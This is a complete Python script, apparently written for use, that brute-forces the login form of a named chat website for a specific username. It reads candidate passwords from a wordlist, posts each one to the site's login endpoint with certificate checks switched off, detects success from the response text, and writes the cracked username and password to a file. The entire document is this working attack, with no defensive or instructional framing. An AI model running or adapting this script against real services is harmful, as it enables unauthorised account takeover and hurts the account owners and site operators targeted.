import requests
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://itamilchat.com/system/action/login.php"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

username = "TorRaider"  # Change this

with open("u.txt", "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f]

for password in passwords:
    data = {
        "token": "0",
        "cp": "home",
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)

        # Adjust this success logic as needed
        if "logout" in response.text.lower() or "cp=home" in response.text:
            print(f"\n✅ SUCCESS: Username: {username}, Password: {password}")
            with open("found.txt", "w") as f_out:
                f_out.write(f"{username}:{password}\n")
            break
        else:
            print(f"[❌] Tried: {password}")

    except requests.exceptions.RequestException as e:
        print(f"[⚠️ ERROR] {e}")
        time.sleep(10)

    time.sleep(2)

